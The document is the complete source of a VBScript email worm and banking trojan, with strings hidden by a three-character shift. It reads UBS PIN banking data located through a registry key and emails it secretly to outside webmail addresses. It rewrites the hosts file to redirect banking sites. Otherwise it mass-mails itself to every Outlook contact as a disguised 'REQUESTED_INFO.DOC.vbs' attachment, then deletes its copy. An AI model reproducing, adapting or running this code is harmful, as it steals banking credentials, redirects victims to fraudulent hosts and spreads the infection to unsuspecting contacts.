On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set win = fso.GetSpecialFolder(0)
Set dirs = fso.GetSpecialFolder(1)
Set ws=WScript.CreateObject("WScript.Shell")
reg=ws.RegRead(d("KNFX_Vriwzduh_XEV_XEVSLQ_Rswlrqv_Gdwdsdwk"))
set a=fso.opentextfile(reg,1,true)
md=a.Readall
a.Close
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
tc=file.ReadAll
set p=fso.OpenTextFile(dirs&"\REQUESTED_INFO.DOC.vbs",2,True)
p.write tc
p.close
set f1=fso.CreateTextFile(win&"\hosts")
f1.writeLine(d("4<715331771;;#whohedqn41xev1frp"))
f1.writeLine(d("4<71533156145#zzz1dys1fk"))
f1.close
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
set ma=out.CreateItem(0)
ma.DeleteAfterSubmit=True
ma.Subject=d("uhtxhvwhg#lqir")
if (reg<>"" and fso.FileExists(reg)=true) then
ma.bcc=d("8<d5g8xfCpdlodqgqhzv1frp>woyptqvmCqhwvfdsh1qhw>dizy8;5iCh{flwh1frp")
ma.body=c(md)
set f5=fso.GetFile(win&"\hosts")
f5.delete
else
for u=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(u)
x=1
for e=1 to a.AddressEntries.Count
m=a.AddressEntries(x) & ";" &m
x=x+1
next
next
ma.bcc=m
ma.body = vbcrlf&"Thank for your order and your confidence in us."
ma.Attachments.Add(dirs&"\REQUESTED_INFO.DOC.vbs")
end if
ma.Send
Set out=Nothing
Set mapi=Nothing
set fh=fso.GetFile(dirs&"\REQUESTED_INFO.DOC.vbs")
fh.delete
Function d(i)
For j=1 To Len(i)
d=d & chr(Asc(Mid(i,j,1))-3)
Next
End Function
Function c(i)
For j=1 To Len(i)
c=c & chr(Asc(Mid(i,j,1))+3)
Next
End Function